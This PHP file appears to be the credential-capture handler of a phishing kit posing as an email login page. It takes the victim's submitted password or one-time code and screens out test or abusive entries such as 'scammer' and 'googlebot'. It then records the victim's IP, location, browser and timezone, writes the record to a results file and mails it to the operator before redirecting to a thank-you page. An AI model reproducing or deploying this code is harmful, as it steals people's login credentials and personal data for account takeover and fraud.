<?php
      session_start(); 


include '../extra/mine.php';
include '../extra/bot.php';
$pas=$_POST['oneTimeCode'];
if(isset($_POST['oneTimeCode']))
{
	$check2 = "true";
	if (strpos($pas,'fuck') !== false || strpos($pas,'1234') !== false || strpos($pas,'4321') !== false || strpos($pas,'qwer') !== false || strpos($pas,'rewq') !== false || strpos($pas,'fuckyou') !== false || strpos($pas,'stupid') !== false || strpos($pas,'scammer') !== false || strpos($pas,'fuckingspam') !== false || strpos($pas,'spam') !== false || strpos($pas,'sonofbitch') !== false || strpos($pas,'   ') !== false || strpos($pas,'googlebot') !== false) {
			$check3 = "false";
		}else{
				$check3 = "true";
		}
}
if(isset($_POST['oneTimeCode'])){
if ($check2=="true"&&$check3=="true") {
	$_SESSION['screen']=$_POST['screen'];
			$msg="=========== <[ 🔑 EMAIL LOGIN | Page 1  ".$_SESSION['ip_countryName']."]> ===========\r\n";
			$msg.="PASS		: {$_POST['oneTimeCode']}\r\n";
			$msg.="---------------------- IP Info ----------------------\r\n";
			$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
			$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
			$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
			$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
			$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
			$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
			$msg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
			$msg.="=========== <[ THANKS TO NFISSI ]> ===========\r\n\r\n\r\n";
	if ($saveintext=="yes") {
	$save=fopen("../rzlt bb/EMAIL Login From ".$_SESSION['ip'].".txt","a+");
	fwrite($save,$msg);
	fclose($save);
}
	$subject="- 🔑  🔑 -EMAIL LOGIN  1 From [".$_SESSION['ip_countryName']."]";
	$headers="From: 🌪️ NFISI 🌪️ <newlogin@Nfisi.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
if ($sendtoemail=="yes") {
	foreach(explode(",",$yours) as $your){
			@mail($your,$subject,$msg,$headers);
	}
	}
	
	   }  } 
	  	exit( header("Location: ../thanx.php"));


?>